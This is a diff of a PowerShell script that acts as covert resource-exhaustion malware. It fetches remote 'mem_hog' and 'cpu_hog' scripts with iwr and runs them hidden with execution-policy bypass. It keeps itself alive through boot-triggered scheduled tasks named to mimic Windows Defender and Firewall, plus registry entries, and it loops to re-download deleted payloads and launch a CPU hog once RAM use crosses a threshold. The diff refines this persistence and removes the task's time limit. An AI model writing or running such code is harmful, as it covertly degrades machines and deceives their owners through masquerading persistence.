@@ -36,7 +36,6 @@ if(-not($itemMem)){
     $idx = Get-Random -Minimum 0 -Maximum $paths.Length
     $memHogPath = $paths[$idx]
     $memHogPath = "$memHogPath\mem_hog.ps1"
-    iwr -Uri $memHogUri -OutFile $memHogPath
     New-ItemProperty -Path "$basePath" -Name $memPropertyName -Value $memHogPath -Force | Out-Null
 }else { $memHogPath = $itemMem.$memPropertyName }
 
@@ -46,14 +45,10 @@ if(-not($itemMem)){
 #     $idx = Get-Random -Minimum 0 -Maximum $paths.Length
 #     $storageHogPath = $paths[$idx]
 #     $storageHogPath = "$storageHogPath\storage_hog.ps1"
-#     iwr -Uri $storageHogUri -OutFile $storageHogPath
 #     New-ItemProperty -Path "$basePath" -Name $storagePropertyName -Value $storageHogPath -Force | Out-Null
 # }else { $storageHogPath = $itemStore.$storagePropertyName }
 
 $threshold = Get-Random -Minimum 80 -Maximum 86
-$idx = Get-Random -Minimum 0 -Maximum $paths.Length
-$cpuHogPath = $paths[$idx]
-$cpuHogPath = "$cpuHogPath\cpu_hog.ps1"
 $memHogTaskName = "windows defender profile"
 $storageHogTaskName = "windows firewall profile"
 $memTaskRunAction = "-ep bypass -noP -w hidden start-process powershell.exe -windowstyle hidden '$memHogPath'"
@@ -103,15 +98,19 @@ function CheckTask-And-Recreate {
             <Delay>PT30S</Delay>
         </BootTrigger>
     </Triggers>
+    <Settings>
+        <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+        <ExecutionTimeLimit>PT0S</ExecutionTimeLimit> 
+    </Settings>
     <Actions Context="Author">
         <Exec>
-            <Command>powershell.exe</Command>
+            <Command>powershell</Command>
             <Arguments>$taskRunAction</Arguments>
         </Exec>
     </Actions>
 </Task>
 "@
-            write-output $xml | Out-File -FilePath "$env:temp\gg.xml" -Force
+            $xml | Out-File -FilePath "$env:temp\gg.xml" -Force
             schtasks /create /tn $taskName /xml "$env:temp\gg.xml" /f
             schtasks /run /tn $taskName
             Remove-Item -Path "$env:temp\gg.xml" -Force
@@ -132,14 +131,12 @@ function CheckTask-And-Recreate {
 while ($true) {
 
     if(-not(Test-Path $memHogPath -PathType Leaf)){
-        schtasks /end /tn $memHogTaskName
         $memHogPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
         $memHogPath = "$memHogPath\mem_hog.ps1"
         iwr -Uri $memHogUri -OutFile $memHogPath
-        $memTaskRunAction = "powershell -ep bypass -noP -w hidden start-process powershell.exe -windowstyle hidden '$memHogPath'"
+        $memTaskRunAction = "-ep bypass -noP -w hidden start-process powershell.exe -windowstyle hidden '$memHogPath'"
         Set-ItemProperty -Path "$basePath" -Name $memPropertyName -Value $memHogPath -Force | Out-Null
-        schtasks /change /tn $memHogTaskName /tr $memTaskRunAction
-        schtasks /run /tn $memHogTaskName
+        schtasks /delete /tn $memHogTaskName /f 2>&1 | Out-Null
     }
     # if(-not(Test-Path $storageHogPath -PathType Leaf)){
     #     schtasks /end /tn $storageHogTaskName
@@ -157,13 +154,9 @@ while ($true) {
     $curr = Get-RamPercentage
     if($curr -ge $threshold){
         echo "threshold $threshold reached at $curr" >> "C:\thres.txt"
+        $cpuHogPath = "$($paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)])\cpu_hog.ps1"
         iwr -Uri $cpuHogUri -OutFile $cpuHogPath
-        powershell -ep bypass -w hidden -noP start-process powershell.exe -windowstyle hidden $cpuHogPath
+        powershell.exe -ep bypass -w hidden -noP $cpuHogPath
     }
 
 }
-
-
-```xml
-
-``` 
